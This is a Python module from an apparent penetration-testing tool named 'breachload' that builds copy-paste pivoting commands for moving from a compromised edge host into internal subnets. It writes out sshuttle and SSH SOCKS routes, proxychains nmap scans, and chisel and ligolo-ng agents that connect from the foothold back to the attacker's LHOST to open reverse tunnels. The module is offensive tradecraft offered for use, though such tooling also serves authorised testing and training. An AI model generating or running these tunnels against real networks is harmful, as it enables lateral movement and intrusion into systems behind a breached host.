"""Pivoting / tunnelling planner - reach internal subnets through a foothold.

Once breachload has code execution on an edge host, the interesting network is
usually *behind* it: a second subnet the attacker box can't route to. This module
generates the ready-to-run tunnelling commands for the common methods - sshuttle,
chisel, ligolo-ng, and plain SSH port-forwards - with the engagement's LHOST and the
foothold/target details filled in, plus the one-line note on when to pick each.

Pure command generation (no execution, no I/O) - the same guided, copy-paste-ready
posture as `suggest`/`adchain`. The operator runs the pieces; breachload removes the
"what's the exact syntax again?" tax that stalls a pivot mid-engagement.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class PivotOption:
    tool: str
    when: str                         # one-liner: when this method is the right pick
    attacker_cmds: list[str] = field(default_factory=list)
    target_cmds: list[str] = field(default_factory=list)
    needs: str = ""                   # prerequisite (ssh creds / upload / tun / ...)


def pivot_plan(
    lhost: str,
    *,
    via_host: str,
    subnet: str | None = None,
    ssh_user: str | None = None,
    ssh_port: int = 22,
    socks_port: int = 1080,
    chisel_port: int = 8000,
) -> list[PivotOption]:
    """Tunnelling options to reach ``subnet`` (or the whole far side) via ``via_host``.

    ``lhost`` is the attacker box; ``via_host`` is the compromised edge host. If
    ``ssh_user`` is given, the SSH-based methods are fully filled in.
    """
    lhost = lhost or "LHOST"
    net = subnet or "10.0.0.0/24"
    opts: list[PivotOption] = []

    # sshuttle - cleanest when we have SSH creds and want a transparent route.
    ssh_target = f"{ssh_user}@{via_host}" if ssh_user else f"<user>@{via_host}"
    opts.append(PivotOption(
        tool="sshuttle",
        when="You have SSH creds on the edge host and want a transparent VPN-like route.",
        needs="SSH credentials on the foothold; sshuttle on the attacker box.",
        attacker_cmds=[f"sshuttle -r {ssh_target} {net} -x {via_host} "
                       f"--ssh-cmd 'ssh -p {ssh_port}'"]))

    # SSH dynamic SOCKS - no extra tooling, then proxychains everything.
    opts.append(PivotOption(
        tool="ssh -D (dynamic SOCKS)",
        when="You have SSH creds and prefer a SOCKS proxy (proxychains) over a route.",
        needs="SSH credentials on the foothold; a SOCKS entry in proxychains.conf.",
        attacker_cmds=[f"ssh -N -D {socks_port} -p {ssh_port} {ssh_target}",
                       f"# then: echo 'socks5 127.0.0.1 {socks_port}' >> /etc/proxychains.conf",
                       f"proxychains nmap -sT -Pn {net}"]))

    # chisel - reverse SOCKS when you only have a shell (no SSH), through the foothold.
    opts.append(PivotOption(
        tool="chisel (reverse SOCKS)",
        when="You only have a webshell/command exec (no SSH) - tunnel back over HTTP.",
        needs="Upload the chisel binary to the foothold (matching arch).",
        attacker_cmds=[f"chisel server -p {chisel_port} --reverse"],
        target_cmds=[f"./chisel client {lhost}:{chisel_port} R:{socks_port}:socks",
                     f"# attacker: proxychains -> socks5 127.0.0.1 {socks_port}"]))

    # ligolo-ng - a real tun interface, nicest for scanning a whole subnet.
    opts.append(PivotOption(
        tool="ligolo-ng",
        when="You want a real tun interface (full nmap, no proxychains) into the subnet.",
        needs="ligolo proxy on attacker + agent uploaded to the foothold; a tun route.",
        attacker_cmds=["sudo ip tuntap add user $USER mode tun ligolo && "
                       "sudo ip link set ligolo up",
                       f"sudo ip route add {net} dev ligolo",
                       "./proxy -selfcert -laddr 0.0.0.0:11601"],
        target_cmds=[f"./agent -connect {lhost}:11601 -ignore-cert",
                     "# in ligolo: session -> start"]))

    # Plain SSH local forward - single internal service, no proxy stack.
    opts.append(PivotOption(
        tool="ssh -L (local forward)",
        when="You need just one internal service reachable locally (e.g. an internal DB).",
        needs="SSH credentials on the foothold.",
        attacker_cmds=[f"ssh -N -L 8443:<internal_host>:443 -p {ssh_port} {ssh_target}",
                       "# then hit https://127.0.0.1:8443"]))

    return opts


def render_pivot(opts: list[PivotOption]) -> list[str]:
    """Human-readable, copy-paste-ready pivot options for the CLI."""
    if not opts:
        return ["pivot: no options generated."]
    lines: list[str] = []
    for o in opts:
        lines.append(f"[{o.tool}] {o.when}")
        if o.needs:
            lines.append(f"    needs: {o.needs}")
        for c in o.attacker_cmds:
            lines.append(f"    attacker$ {c}")
        for c in o.target_cmds:
            lines.append(f"    target$   {c}")
        lines.append("")
    return lines
